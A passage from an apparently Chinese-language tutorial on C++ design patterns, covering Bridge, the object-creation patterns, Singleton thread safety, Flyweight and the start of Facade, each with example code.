Connect()=0; virtual ~Messager()&#123;&#125;&#125;;// 平台实现// 注意这里 PCMessagerBase 依然有纯虚函数(Login等)，不能实例化class PCMessagerBase : public Messager&#123;public: virtual void PlaySound()&#123;...&#125; virtual void DrawShape()&#123;...&#125; virtual void WriteText()&#123;...&#125; virtual void Connect()&#123;...&#125;&#125;;class MobileMessagerBase : public Messager&#123;public: virtual void PlaySound()&#123;...&#125; virtual void DrawShape()&#123;...&#125; virtual void WriteText()&#123;...&#125; virtual void Connect()&#123;...&#125;&#125;;// 业务抽象// 这里的类数，在平台实现类数基础上成倍增长class PCMessagerLite : public PCMessagerBase &#123;public: virtual void Login(string username, string password)&#123; PCMessagerBase::Connect(); &#125; virtual void SendMessage(string message)&#123; PCMessagerBase::WriteText(); &#125; virtual void SendPicture(Image image)&#123; PCMessagerBase::DrawShape(); &#125;&#125;;class PCMessagerPerfect : public PCMessagerBase &#123;public: virtual void Login(string username, string password)&#123; PCMessagerBase::PlaySound(); PCMessagerBase::Connect(); &#125; virtual void SendMessage(string message)&#123; PCMessagerBase::PlaySound(); PCMessagerBase::WriteText(); &#125; virtual void SendPicture(Image image)&#123; PCMessagerBase::PlaySound(); PCMessagerBase::DrawShape(); &#125;&#125;;class MobileMessagerLite : public MobileMessagerBase &#123;...&#125;;class MobileMessagerPerfect : public MobileMessagerBase &#123;...&#125;; 实现二，使用组合而不是继承，同时分离基类中平台实现和业务逻辑部分，保证两部分的派生类都可以分别实例化。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273// 分离基类中平台实现和业务逻辑部分class Messager&#123;protected: MessagerImp* messagerImp; // 组合 Messager(MessagerImp* imp): messagerImp(imp) &#123;...&#125;public: virtual void Login(string username, string password)=0; virtual void SendMessage(string message)=0; virtual void SendPicture(Image image)=0; virtual ~Messager()&#123;&#125;&#125;;class MessagerImp&#123;public: virtual void PlaySound()=0; virtual void DrawShape()=0; virtual void WriteText()=0; virtual void Connect()=0; virtual MessagerImp()&#123;&#125;&#125;;// 平台实现// 这里没有纯虚函数，能实例化class PCMessagerImp : public MessagerImp&#123;public: virtual void PlaySound()&#123;...&#125; virtual void DrawShape()&#123;...&#125; virtual void WriteText()&#123;...&#125; virtual void Connect()&#123;...&#125;&#125;;class MobileMessagerImp : public MessagerImp&#123;public: virtual void PlaySound()&#123;...&#125; virtual void DrawShape()&#123;...&#125; virtual void WriteText()&#123;...&#125; virtual void Connect()&#123;...&#125;&#125;;// 业务抽象 m// 基类中MessagerImp* 成员，利用多态，实现不同平台实现的组合class MessagerLite:public Messager &#123;public: MessagerLite(MessagerImp *imp): Messager(imp) &#123;...&#125; virtual void Login(string username, string password)&#123; messagerImp-&gt;Connect(); &#125; virtual void SendMessage(string message)&#123; messagerImp-&gt;WriteText(); &#125; virtual void SendPicture(Image image)&#123; messagerImp-&gt;DrawShape(); &#125;&#125;;class MessagerPerfect:public Messager &#123;public: MessagerPerfect(MessagerImp *imp): Messager(imp) &#123;...&#125; virtual void Login(string username, string password)&#123; messagerImp-&gt;PlaySound(); messagerImp-&gt;Connect(); &#125; virtual void SendMessage(string message)&#123; messagerImp-&gt;PlaySound(); messagerImp-&gt;WriteText(); &#125; virtual void SendPicture(Image image)&#123; messagerImp-&gt;PlaySound(); messagerImp-&gt;DrawShape(); &#125;&#125;; 桥模式相比于Decorator模式，主要是针对基类，分离了不同变化方向（有点抽象，就像x轴y轴代表不同维度）的成员，分离成多个类。 抽象代码结构 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697#include &lt;iostream&gt;/* * Implementor * defines the interface for implementation classes */class Implementor&#123;public: virtual ~Implementor() &#123;&#125; virtual void action() = 0; // ...&#125;;/* * Concrete Implementors * implement the Implementor interface and define concrete implementations */class ConcreteImplementorA : public Implementor&#123;public: ~ConcreteImplementorA() &#123;&#125; void action() &#123; std::cout &lt;&lt; \"Concrete Implementor A\" &lt;&lt; std::endl; &#125; // ...&#125;;class ConcreteImplementorB : public Implementor&#123;public: ~ConcreteImplementorB() &#123;&#125; void action() &#123; std::cout &lt;&lt; \"Concrete Implementor B\" &lt;&lt; std::endl; &#125; // ...&#125;;/* * Abstraction * defines the abstraction's interface */class Abstraction&#123;public: virtual ~Abstraction() &#123;&#125; virtual void operation() = 0; // ...&#125;;/* * RefinedAbstraction * extends the interface defined by Abstraction */class RefinedAbstraction : public Abstraction&#123;public: ~RefinedAbstraction() &#123;&#125; RefinedAbstraction(Implementor *impl) : implementor(impl) &#123;&#125; void operation() &#123; implementor-&gt;action(); &#125; // ...private: Implementor *implementor;&#125;;int main()&#123; Implementor *ia = new ConcreteImplementorA; Implementor *ib = new ConcreteImplementorB; Abstraction *abstract1 = new RefinedAbstraction(ia); abstract1-&gt;operation(); Abstraction *abstract2 = new RefinedAbstraction(ib); abstract2-&gt;operation(); delete abstract1; delete abstract2; delete ia; delete ib; return 0;&#125; 对象创建相关模式 通过“对象创建” 模式绕开new，来避免对象创建（new）过程中所导致的紧耦合（依赖具体类），从而支持对象创建的稳定。它是接口抽象之后的第一步工作。 面向接口，可以视为依赖抽象基类，调用抽象基类方法。 典型模式: Factory Method Abstract Factory Prototype Builder Factory Method 在软件系统中，经常面临着创建对象的工作；由于需求的变化，需要创建的对象的具体类型经常变化。 将程序中，对具体对象的依赖，转变为对抽象的创建对象的接口的依赖。 定义一个用于创建对象的接口，让子类决定实例化哪一个类。Factory Method使得一个类的实例化延迟（目的：解耦，手段：虚函数）到子类。 示例1 实现一个能够切分不同类型文件的切分程序。 实现一，直接建立不同的具体切分对象。 123456789class ISplitter&#123;public: virtual void split()=0; virtual ~ISplitter()&#123;&#125;&#125;;class BinarySplitter : public ISplitter&#123;...&#125;;class TxtSplitter: public ISplitter&#123;...&#125;; 1234567class MainForm : public Form &#123;public: void Button_Click()&#123; ISplitter * splitter = new BinarySplitter();//依赖具体类 splitter-&gt;split(); &#125;&#125;; 显然，new BinarySplitter()需要根据不同的文件类型，进行修改。一旦修改，源文件就需要重新编译。 实现二，使用抽象的工厂，提供对象创建的接口。 123456789101112131415161718192021222324252627282930313233//抽象类class ISplitter&#123;public: virtual void split()=0; virtual ~ISplitter()&#123;&#125;&#125;;//工厂基类class SplitterFactory&#123;public: virtual ISplitter* CreateSplitter()=0; virtual ~SplitterFactory()&#123;&#125;&#125;;//具体类class BinarySplitter : public ISplitter&#123;...&#125;;class TxtSplitter: public ISplitter&#123;...&#125;;//具体工厂class BinarySplitterFactory: public SplitterFactory&#123;public: virtual ISplitter* CreateSplitter()&#123; return new BinarySplitter(); &#125;&#125;;class TxtSplitterFactory: public SplitterFactory&#123;public: virtual ISplitter* CreateSplitter()&#123; return new TxtSplitter(); &#125;&#125;; 123456789101112class MainForm : public Form&#123; SplitterFactory* factory;//工厂public: MainForm(SplitterFactory* factory)&#123; this-&gt;factory=factory; &#125; void Button_Click()&#123; ISplitter * splitter=factory-&gt;CreateSplitter(); //多态new splitter-&gt;split(); &#125;&#125;; 现在，创建不同对象，只需要输入不同的工厂对象。虽然依旧是要创建对象，但是，在编译单元层面，以上代码是不用重新编译的。有新的类型需要创建，直接增加一个新的源文件即可。 Factory Method模式用于隔离类对象的使用者和具体类型之间的耦合关系。面对一个经常变化的具体类型，紧耦合关系(new)会导致软件的脆弱。 将所要创建的具体对象工作延迟到子类（BinarySplitterFactory、TxtSplitterFactory），从而实现一种扩展（而非更改）的策略。 抽象代码结构 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111#include &lt;iostream&gt;#include &lt;string&gt;/* * Product * products implement the same interface so that the classes can refer * to the interface not the concrete product */class Product&#123;public: virtual ~Product() &#123;&#125; virtual std::string getName() = 0; // ...&#125;;/* * Concrete Product * define product to be created */class ConcreteProductA : public Product&#123;public: ~ConcreteProductA() &#123;&#125; std::string getName() &#123; return \"type A\"; &#125; // ...&#125;;/* * Concrete Product * define product to be created */class ConcreteProductB : public Product&#123;public: ~ConcreteProductB() &#123;&#125; std::string getName() &#123; return \"type B\"; &#125; // ...&#125;;/* * Creator * contains the implementation for all of the methods * to manipulate products except for the factory method */class Creator&#123;public: virtual ~Creator() &#123;&#125; virtual Product* createProductA() = 0; virtual Product* createProductB() = 0; virtual void removeProduct( Product *product ) = 0; // ...&#125;;/* * Concrete Creator * implements factory method that is responsible for creating * one or more concrete products ie. it is class that has * the knowledge of how to create the products */class ConcreteCreator : public Creator&#123;public: ~ConcreteCreator() &#123;&#125; Product* createProductA() &#123; return new ConcreteProductA(); &#125; Product* createProductB() &#123; return new ConcreteProductB(); &#125; void removeProduct( Product *product ) &#123; delete product; &#125; // ...&#125;;int main()&#123; Creator *creator = new ConcreteCreator(); Product *p1 = creator-&gt;createProductA(); std::cout &lt;&lt; \"Product: \" &lt;&lt; p1-&gt;getName() &lt;&lt; std::endl; creator-&gt;removeProduct( p1 ); Product *p2 = creator-&gt;createProductB(); std::cout &lt;&lt; \"Product: \" &lt;&lt; p2-&gt;getName() &lt;&lt; std::endl; creator-&gt;removeProduct( p2 ); delete creator; return 0;&#125; 以上代码的 creator 将不同创建方法整合到一个类中。也可以按照示例1的方法，creator 转化为不同的子类。 Abstract Factory 类似Factory Method的作用，不过需要创建的对象是“一系列相互关联的对象”。这个时候，将这一系列对象的创建，汇集到一个工厂类中。 示例2 实现一个可以使用不同的数据库的类，可进行数据库的连接、SQL语句执行。 实现一，根据不同功能，建立不同的工厂。 12345678910111213141516171819202122232425262728//Connection基类class IDBConnection&#123;...&#125;;class IDBConnectionFactory&#123;public: virtual IDBConnection* CreateDBConnection()=0;&#125;;//Command基类class IDBCommand&#123;&#125;;class IDBCommandFactory&#123;public: virtual IDBCommand* CreateDBCommand()=0;&#125;;//Reader基类class IDataReader&#123;&#125;;class IDataReaderFactory&#123;public: virtual IDataReader* CreateDataReader()=0;&#125;;//SQL数据库类工厂 3 个class SqlConnection: public IDBConnection&#123;&#125;;class SqlConnectionFactory:public IDBConnectionFactory&#123;&#125;;class SqlCommand: public IDBCommand&#123;&#125;;class SqlCommandFactory:public IDBCommandFactory&#123;&#125;;class SqlDataReader: public IDataReader&#123;&#125;;class SqlDataReaderFactory:public IDataReaderFactory&#123;&#125;; 12345678910111213141516171819202122// 使用3个工厂class EmployeeDAO&#123; IDBConnectionFactory* dbConnectionFactory; IDBCommandFactory* dbCommandFactory; IDataReaderFactory* dataReaderFactory; public: // 构造函数传入Factory指针 ... vector&lt;EmployeeDO&gt; GetEmployees()&#123; IDBConnection* connection = dbConnectionFactory-&gt;CreateDBConnection(); connection-&gt;ConnectionString(\"...\"); IDBCommand* command = dbCommandFactory-&gt;CreateDBCommand(); command-&gt;CommandText(\"...\"); command-&gt;SetConnection(connection); //关联性,使用connection IDBDataReader* reader = command-&gt;ExecuteReader(); while (reader-&gt;Read())&#123;...&#125; &#125;&#125;; 以上代码，除了不够简洁，还有可能传入不匹配的 Connection 对象和 Command 对象（比如 SQL的Connection 和 MongoDB的Command）。 实现二，使用一个工厂，完成对象创建。 12345678910111213141516171819202122232425262728293031//数据库访问有关的基类class IDBConnection&#123;...&#125;;class IDBCommand&#123;...&#125;;class IDataReader&#123;...&#125;;// Factory基类class IDBFactory&#123;public: ... virtual IDBConnection* CreateDBConnection()=0; virtual IDBCommand* CreateDBCommand()=0; virtual IDataReader* CreateDataReader()=0; ...&#125;;// SQL数据库的相关类class SqlConnection: public IDBConnection&#123;...&#125;;class SqlCommand: public IDBCommand&#123;...&#125;;class SqlDataReader: public IDataReader&#123;...&#125;;// SQL数据库各个相关类的创建工厂class SqlDBFactory:public IDBFactory&#123;public: ... virtual IDBConnection* CreateDBConnection()=0; virtual IDBCommand* CreateDBCommand()=0; virtual IDataReader* CreateDataReader()=0; ...&#125;; 12345678910111213141516class EmployeeDAO&#123; IDBFactory* dbFactory; public: vector&lt;EmployeeDO&gt; GetEmployees()&#123; IDBConnection* connection = dbFactory-&gt;CreateDBConnection(); connection-&gt;ConnectionString(\"...\"); IDBCommand* command = dbFactory-&gt;CreateDBCommand(); command-&gt;CommandText(\"...\"); command-&gt;SetConnection(connection); IDBDataReader* reader = command-&gt;ExecuteReader(); while (reader-&gt;Read())&#123;...&#125; &#125;&#125;; 使用一个类管理相关对象的创建。Abstract Factory模式主要在于应对“新系列”的需求变动。其缺点在于难以应对“新对象”的需求变动，这就是Factory Method的事情了。 抽象代码结构 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156#include &lt;iostream&gt;/* * Product A * products implement the same interface so that the classes can refer * to the interface not the concrete product */class ProductA&#123;public: virtual ~ProductA() &#123;&#125; virtual const char* getName() = 0; // ...&#125;;/* * ConcreteProductAX and ConcreteProductAY * define objects to be created by concrete factory */class ConcreteProductAX : public ProductA&#123;public: ~ConcreteProductAX() &#123;&#125; const char* getName() &#123; return \"A-X\"; &#125; // ...&#125;;class ConcreteProductAY : public ProductA&#123;public: ~ConcreteProductAY() &#123;&#125; const char* getName() &#123; return \"A-Y\"; &#125; // ...&#125;;/* * Product B * same as Product A, Product B declares interface for concrete products * where each can produce an entire set of products */class ProductB&#123;public: virtual ~ProductB() &#123;&#125; virtual const char* getName() = 0; // ...&#125;;/* * ConcreteProductBX and ConcreteProductBY * same as previous concrete product classes */class ConcreteProductBX : public ProductB&#123;public: ~ConcreteProductBX() &#123;&#125; const char* getName() &#123; return \"B-X\"; &#125; // ...&#125;;class ConcreteProductBY : public ProductB&#123;public: ~ConcreteProductBY() &#123;&#125; const char* getName() &#123; return \"B-Y\"; &#125; // ...&#125;;/* * Abstract Factory * provides an abstract interface for creating a family of products */class AbstractFactory&#123;public: virtual ~AbstractFactory() &#123;&#125; virtual ProductA *createProductA() = 0; virtual ProductB *createProductB() = 0;&#125;;/* * Concrete Factory X and Y * each concrete factory create a family of products and client uses * one of these factories so it never has to instantiate a product object */class ConcreteFactoryX : public AbstractFactory&#123;public: ~ConcreteFactoryX() &#123;&#125; ProductA *createProductA() &#123; return new ConcreteProductAX(); &#125; ProductB *createProductB() &#123; return new ConcreteProductBX(); &#125; // ...&#125;;class ConcreteFactoryY : public AbstractFactory&#123;public: ~ConcreteFactoryY() &#123;&#125; ProductA *createProductA() &#123; return new ConcreteProductAY(); &#125; ProductB *createProductB() &#123; return new ConcreteProductBY(); &#125; // ...&#125;;int main()&#123; ConcreteFactoryX *factoryX = new ConcreteFactoryX(); ConcreteFactoryY *factoryY = new ConcreteFactoryY(); ProductA *p1 = factoryX-&gt;createProductA(); std::cout &lt;&lt; \"Product: \" &lt;&lt; p1-&gt;getName() &lt;&lt; std::endl; ProductA *p2 = factoryY-&gt;createProductA(); std::cout &lt;&lt; \"Product: \" &lt;&lt; p2-&gt;getName() &lt;&lt; std::endl; delete p1; delete p2; delete factoryX; delete factoryY; return 0;&#125; 结构和示例2稍有不同。 Prototype 和Factory Method一样，用于创造对象，但是是通过拷贝原型来创建对象。类的拷贝构造函数需要指定正确。拷贝指的是深拷贝。 和Factory Method不同的是，Prototype更关注对象初始状态的变化，可以创建几种不同的状态的原型，供程序使用。 示例3 示例和Factory Method一样，在Factory Method基础上做了改动，变成Prototype模式。 12345678910111213141516171819202122//将抽象类和工厂基类合并为一个类class ISplitter&#123;public: virtual void split()=0; virtual ISplitter* clone()=0; //通过克隆自己来创建对象 virtual ~ISplitter()&#123;&#125;&#125;;//具体类class BinarySplitter : public ISplitter&#123;public: virtual ISplitter* clone()&#123; return new BinarySplitter(*this); //通过克隆自己来创建对象 &#125;&#125;;class TxtSplitter: public ISplitter&#123;public: virtual ISplitter* clone()&#123; return new TxtSplitter(*this); //通过克隆自己来创建对象 &#125;&#125;; 1234567891011class MainForm : public Form &#123; ISplitter* prototype;//原型对象public: MainForm(ISplitter* prototype)&#123; this-&gt;prototype=prototype; &#125; void Button_Click()&#123; ISplitter * splitter=prototype-&gt;clone(); //克隆原型 splitter-&gt;split(); &#125;&#125;; 当一个系统应该独立于它的产品创建、构成和表示时，要使用 Prototype模式。当一个类的实例只能有几个不同状态组合中的一种时。建立相应数目的原型并克隆它们 可能比每次用合适的状态手工实例化该类更方便一些。 抽象代码结构 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106#include &lt;iostream&gt;#include &lt;string&gt;/* * Prototype * declares an interface for cloning itself */class Prototype&#123;public: virtual ~Prototype() &#123;&#125; virtual Prototype* clone() = 0; virtual std::string type() = 0; // ...&#125;;/* * Concrete Prototype A and B * implement an operation for cloning itself */class ConcretePrototypeA : public Prototype&#123;public: ~ConcretePrototypeA() &#123;&#125; Prototype* clone() &#123; return new ConcretePrototypeA(); &#125; std::string type() &#123; return \"type A\"; &#125; // ...&#125;;class ConcretePrototypeB : public Prototype&#123;public: ~ConcretePrototypeB() &#123;&#125; Prototype* clone() &#123; return new ConcretePrototypeB(); &#125; std::string type() &#123; return \"type B\"; &#125; // ...&#125;;/* * Client * creates a new object by asking a prototype to clone itself */class Client&#123;public: static void init() &#123; types[ 0 ] = new ConcretePrototypeA(); types[ 1 ] = new ConcretePrototypeB(); &#125; static void remove() &#123; delete types[ 0 ]; delete types[ 1 ]; &#125; static Prototype* make( const int index ) &#123; if ( index &gt;= n_types ) &#123; return nullptr; &#125; return types[ index ]-&gt;clone(); &#125; // ...private: static Prototype* types[ 2 ]; // declaration static int n_types;&#125;;Prototype* Client::types[ 2 ]; // definitionint Client::n_types = 2;int main()&#123; Client::init(); Prototype *prototype1 = Client::make( 0 ); std::cout &lt;&lt; \"Prototype: \" &lt;&lt; prototype1-&gt;type() &lt;&lt; std::endl; delete prototype1; Prototype *prototype2 = Client::make( 1 ); std::cout &lt;&lt; \"Prototype: \" &lt;&lt; prototype2-&gt;type() &lt;&lt; std::endl; delete prototype2; Client::remove(); return 0;&#125; Builder 在软件系统中，有时候面临着“一个复杂对象”的创建工作，它的创建过程是一套固定的组合方法，和多个不同的被组合的子对象。 Builder将一个复杂对象的构建与其表示相分离，使得同样的构建过程(稳定)可以创建不同的表示(变化)。 这个类似Template Method，不过Builder是针对对象的创建来进行设计的。 示例4 实现一个程序，可以创建出不同种类的房子图像。 1234567891011121314151617181920212223242526272829303132333435363738// House抽象基类class House&#123; //...&#125;;// House建房配置的基类class HouseBuilder &#123;public: House* GetResult()&#123; return pHouse; &#125; virtual ~HouseBuilder()&#123;&#125;protected: House* pHouse; virtual void BuildPart1()=0; virtual void BuildPart2()=0; virtual void BuildPart3()=0; virtual void BuildPart4()=0; virtual void BuildPart5()=0;&#125;;// 通用图形绘制逻辑，稳定class HouseDirector&#123; HouseBuilder* pHouseBuilder;public: // 注意不要在C++的构造函数中调用虚函数 HouseDirector(HouseBuilder* pHouseBuilder)&#123; this-&gt;pHouseBuilder=pHouseBuilder; &#125; House* Construct()&#123; pHouseBuilder-&gt;BuildPart1(); for (int i = 0; i &lt; 4; i++)&#123; pHouseBuilder-&gt;BuildPart2(); &#125; bool flag=pHouseBuilder-&gt;BuildPart3(); if(flag)&#123; pHouseBuilder-&gt;BuildPart4(); &#125; pHouseBuilder-&gt;BuildPart5(); return pHouseBuilder-&gt;GetResult(); &#125;&#125;; 12345678910111213// 具体类，StoneHouse的参数类class StoneHouse: public House&#123;...&#125;;// 具体类，构建StoneHouse各个部分的具体算法实现class StoneHouseBuilder: public HouseBuilder&#123;protected: virtual void BuildPart1()&#123;...&#125; virtual void BuildPart2()&#123;...&#125; virtual void BuildPart3()&#123;...&#125; virtual void BuildPart4()&#123;...&#125; virtual void BuildPart5()&#123;...&#125; &#125;; 这样如果有其它种类的House，可以新创建House和HouseBuilder的子类即可。 Builder 模式主要用于“分步骤构建一个复杂的对象”。在这其中“分步骤”是一个稳定的算法，而复杂对象的各个部分则经常变化。 变化点在哪里，封装哪里—— Builder模式主要在于应对“复杂对象各个部分”的频繁需求变动。 抽象代码结构 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159#include &lt;iostream&gt;#include &lt;string&gt;/* * Product * the final object that will be created using Builder */class Product&#123;public: void makeA( const std::string &amp;part ) &#123; partA = part; &#125; void makeB( const std::string &amp;part ) &#123; partB = part; &#125; void makeC( const std::string &amp;part ) &#123; partC = part; &#125; std::string get() &#123; return (partA + \" \" + partB + \" \" + partC); &#125; // ... private: std::string partA; std::string partB; std::string partC; // ...&#125;;/* * Builder * abstract interface for creating products */class Builder&#123;public: virtual ~Builder() &#123;&#125; Product get() &#123; return product; &#125; virtual void buildPartA() = 0; virtual void buildPartB() = 0; virtual void buildPartC() = 0; // ...protected: Product product;&#125;;/* * Concrete Builder X and Y * create real products and stores them in the composite structure */class ConcreteBuilderX : public Builder&#123;public: void buildPartA() &#123; product.makeA( \"A-X\" ); &#125; void buildPartB() &#123; product.makeB( \"B-X\" ); &#125; void buildPartC() &#123; product.makeC( \"C-X\" ); &#125; // ...&#125;;class ConcreteBuilderY : public Builder&#123;public: void buildPartA() &#123; product.makeA( \"A-Y\" ); &#125; void buildPartB() &#123; product.makeB( \"B-Y\" ); &#125; void buildPartC() &#123; product.makeC( \"C-Y\" ); &#125; // ...&#125;;/* * Director * responsible for managing the correct sequence of object creation */class Director &#123;public: Director() : builder() &#123;&#125; ~Director() &#123; if ( builder ) &#123; delete builder; &#125; &#125; void set( Builder *b ) &#123; if ( builder ) &#123; delete builder; &#125; builder = b; &#125; Product get() &#123; return builder-&gt;get(); &#125; void construct() &#123; builder-&gt;buildPartA(); builder-&gt;buildPartB(); builder-&gt;buildPartC(); // ... &#125; // ...private: Builder *builder;&#125;;int main()&#123; Director director; director.set( new ConcreteBuilderX ); director.construct(); Product product1 = director.get(); std::cout &lt;&lt; \"1st product parts: \" &lt;&lt; product1.get() &lt;&lt; std::endl; director.set( new ConcreteBuilderY ); director.construct(); Product product2 = director.get(); std::cout &lt;&lt; \"2nd product parts: \" &lt;&lt; product2.get() &lt;&lt; std::endl; return 0;&#125; 对象性能相关模式 处理面向对象编程所产生的额外代价，比如太多的对象创建的资源消耗等问题。 典型模式： Singleton Flyweight Singleton 处理一个类，只允许一个实例存在，或者只需要存在一个对象即可。 Singleton保证一个类仅有一个实例，并提供一个访问它的全局访问点。 示例5 单线程环境下实现 123456789101112131415161718class Singleton&#123;private: static Singleton* m_instance; Singleton(); Singleton(const Singleton&amp; other);public: static Singleton* getInstance();&#125;;Singleton* Singleton::m_instance=nullptr;//线程非安全版本Singleton* Singleton::getInstance() &#123; if (m_instance == nullptr) &#123; m_instance = new Singleton(); &#125; return m_instance;&#125; 版本二，代价过高（相对而言） 12345678//线程安全版本，但锁的代价过高. 读变量，不需要获取锁，只有写才需要加锁Singleton* Singleton::getInstance() &#123; Lock lock; if (m_instance == nullptr) &#123; m_instance = new Singleton(); &#125; return m_instance;&#125; 双检查，第一个判断保证读变量不会获取锁。第二个判断，保证当两个或多个线程都进入了第一个判断内，不会创建多个对象。 12345678910//双检查锁，但由于内存读写reorder不安全，直接以下代码是不能应用的Singleton* Singleton::getInstance() &#123; if(m_instance==nullptr)&#123; Lock lock; if (m_instance == nullptr) &#123; m_instance = new Singleton(); &#125; &#125; return m_instance;&#125; 但是，m_instance = new Singleton() 在cpu指令执行的时候，可能会出现指令reorder的情况。因为编译器会对汇编代码进行优化。比如，指令顺序为（分配内存--调用构造器--将对象赋值到变量内存），可能变成（分配内存--将对象赋值到变量内存--调用构造器）。 因此，当指令执行顺序是（分配内存--将对象赋值到变量内存--调用构造器）时，线程1可能处在（分配内存--将对象赋值到变量内存）阶段，此时 m_instance != nullptr。如果此时线程2，开始第一个判断，会直接跳转到 return m_instance，但是 m_instance 并没有调用构造器，并不是一个可用的对象。问题就出现了。 C++ 11版本之后的跨平台实现双检查： 123456789101112131415161718//C++ 11版本之后的跨平台实现 (Java 中使用 volatile 禁止cpu指令reorder)std::atomic&lt;Singleton*&gt; Singleton::m_instance;std::mutex Singleton::m_mutex;Singleton* Singleton::getInstance() &#123; Singleton* tmp = m_instance.load(std::memory_order_relaxed); std::atomic_thread_fence(std::memory_order_acquire);//获取内存fence if (tmp == nullptr) &#123; std::lock_guard&lt;std::mutex&gt; lock(m_mutex); tmp = m_instance.load(std::memory_order_relaxed); if (tmp == nullptr) &#123; tmp = new Singleton; std::atomic_thread_fence(std::memory_order_release);//释放内存fence m_instance.store(tmp, std::memory_order_relaxed); &#125; &#125; return tmp;&#125; Singleton的构造器可以设置为protected，允许子类派生。一般不要支持拷贝构造函数，或者clone接口。 抽象代码结构 单线程版 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859#include &lt;iostream&gt;/* * Singleton * has private static variable to hold one instance of the class * and method which gives us a way to instantiate the class */class Singleton&#123;public: // The copy constructor and assignment operator // are defined as deleted, which means that you // can't make a copy of singleton. // // Note: you can achieve the same effect by declaring // the constructor and the operator as private Singleton( Singleton const&amp; ) = delete; Singleton&amp; operator=( Singleton const&amp; ) = delete; static Singleton* get() &#123; if ( !instance ) &#123; instance = new Singleton(); &#125; return instance; &#125; static void restart() &#123; if ( instance ) &#123; delete instance; &#125; &#125; void tell() &#123; std::cout &lt;&lt; \"This is Singleton.\" &lt;&lt; std::endl; // ... &#125; // ...private: Singleton() &#123;&#125; static Singleton *instance; // ...&#125;;Singleton* Singleton::instance = nullptr;int main()&#123; Singleton::get()-&gt;tell(); Singleton::restart(); return 0;&#125; Flyweight 对于大量存在的对象，会产生较高的内存上代价。 Flyweight（享元）运用共享技术有效地支持大量细粒度的对象。 原理就是将对象以一个全局唯一key，储存在一个对象记录数据结构中。当下一次使用同一对象，直接查找记录，返回已经存在的对象。 示例6 实现能够显示每种字体属性的程序。 12345678910111213141516171819202122232425262728293031323334class Font &#123;private: //unique object key string key; //object state //...public: Font(const string&amp; key)&#123;...&#125;&#125;;class FontFactory&#123;private: // 使用map作为一个对象记录 map&lt;string,Font* &gt; fontPool; public: Font* GetFont(const string&amp; key)&#123; map&lt;string,Font*&gt;::iterator item=fontPool.find(key); if(item!=footPool.end())&#123; return fontPool[key]; &#125; else&#123; Font* font = new Font(key); fontPool[key]= font; return font; &#125; &#125; void clear()&#123; //... &#125;&#125;; 享元，在对象数量很多，并且因此造成性能负担的时候，可以考虑使用。 抽象代码结构 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106#include &lt;iostream&gt;#include &lt;map&gt;/* * Flyweight * declares an interface through which flyweights can receive * and act on extrinsic state */class Flyweight&#123;public: virtual ~Flyweight() &#123;&#125; virtual void operation() = 0; // ...&#125;;/* * UnsharedConcreteFlyweight * not all subclasses need to be shared */class UnsharedConcreteFlyweight : public Flyweight&#123;public: UnsharedConcreteFlyweight( const int intrinsic_state ) : state( intrinsic_state ) &#123;&#125; ~UnsharedConcreteFlyweight() &#123;&#125; void operation() &#123; std::cout &lt;&lt; \"Unshared Flyweight with state \" &lt;&lt; state &lt;&lt; std::endl; &#125; // ... private: int state; // ...&#125;;/* * ConcreteFlyweight * implements the Flyweight interface and adds storage * for intrinsic state */class ConcreteFlyweight : public Flyweight&#123;public: ConcreteFlyweight( const int all_state ) : state( all_state ) &#123;&#125; ~ConcreteFlyweight() &#123;&#125; void operation() &#123; std::cout &lt;&lt; \"Concrete Flyweight with state \" &lt;&lt; state &lt;&lt; std::endl; &#125; // ... private: int state; // ...&#125;;/* * FlyweightFactory * creates and manages flyweight objects and ensures * that flyweights are shared properly */class FlyweightFactory&#123;public: ~FlyweightFactory() &#123; for ( auto it = flies.begin(); it != flies.end(); it++ ) &#123; delete it-&gt;second; &#125; flies.clear(); &#125; Flyweight *getFlyweight( const int key ) &#123; if ( flies.find( key ) != flies.end() ) &#123; return flies[ key ]; &#125; Flyweight *fly = new ConcreteFlyweight( key ); flies.insert( std::pair&lt;int, Flyweight *&gt;( key, fly ) ); return fly; &#125; // ...private: std::map&lt;int, Flyweight*&gt; flies; // ...&#125;;int main()&#123; FlyweightFactory *factory = new FlyweightFactory; factory-&gt;getFlyweight(1)-&gt;operation(); factory-&gt;getFlyweight(2)-&gt;operation(); delete factory; return 0;&#125; 接口隔离相关模式 在软件构建过程中，某些接口之间的“直接”依赖可能会带来很多问题，甚至无法实现。这时候，往往采用添加一层“间接”的稳定接口层，来实现间接的依赖。 间接的中间层思想，很常见，比如指针就是一种间接层，操作系统是用户程序和机器硬件之间的中间层。 典型模式： Facade (c不是英文字符，整个词是个法文，不过这不重要) Proxy Adapter Mediator Facade 为子系统中的一组接口提供一个一致的界面， Facade模式定义了一个高层接口，这个接口使得这一子系统更加容易使用。 目标效果如图： Facade模式更注重架构层次，偏向架构设计的模式。实现了内部组件和外部客户程序的解耦。其内部组件一般是相互依赖的一系列类型。 Facade模式为一个复杂子系统提供一个简单接口时。子系统往往因为不断演化而变得越来越复杂。 抽象代码结构 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182#include &lt;iostream&gt;/* * Subsystems * implement more complex subsystem functionality * and have no knowledge of the facade */class SubsystemA&#123;public: void suboperation() &#123; std::cout &lt;&lt; \"Subsystem A method\" &lt;&lt; std::endl; // ... &#125; // ...&#125;;class SubsystemB&#123;public: void suboperation() &#123; std::cout &lt;&lt; \"Subsystem B method\" &lt;&lt; std::endl; // ... &#125; 